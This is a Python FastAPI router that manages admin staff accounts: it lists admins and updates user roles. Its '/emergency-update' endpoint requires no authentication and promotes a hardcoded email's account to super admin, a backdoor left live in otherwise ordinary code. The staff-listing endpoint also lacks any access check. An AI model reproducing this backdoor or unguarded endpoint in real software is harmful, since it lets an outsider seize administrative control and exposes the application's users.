from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session, joinedload
from db import get_db 
from models import Users, Role 
from schemas.admins import AdminDisplay, RoleUpdateSchema
from services.roles_logic import update_role
from services.auth import get_current_user

router = APIRouter(prefix="/users/admins", tags=["Staff"])

@router.get("/", response_model=list[AdminDisplay])
def get_staff_members(db: Session = Depends(get_db)):
    """Fetch all users who are either Super Admins (0) or Admins (1)."""
    staff = db.query(Users).options(joinedload(Users.role)).filter( Users.role_id < 2).all()

    if not staff:
        return []

    result = []
    for user in staff:
        result.append({
            "id": str(user.uuid), 
            "username": user.username,
            "uuid": user.uuid,
            "role": user.role.name,
            "roleId": user.role_id
        })
    
    return result

@router.patch("/update-role")
def api_update_role(payload: RoleUpdateSchema, db: Session = Depends(get_db), current_user = Depends(get_current_user)):
    return update_role(new_role_id=payload.new_role_id, identifier=payload.identifier, current_user_uuid=current_user['uuid'], current_user_role_id=current_user['role_id'], db=db)

@router.patch("/emergency-update")
def emergency_promote(db: Session = Depends(get_db)):
    user = db.query(Users).filter(Users.email == "anisynced@gmail.com").first()
    if user:
        user.role_id = 0
        db.commit()
        return {"message": "Emergency promotion successful"}
    return {"message": "User not found"}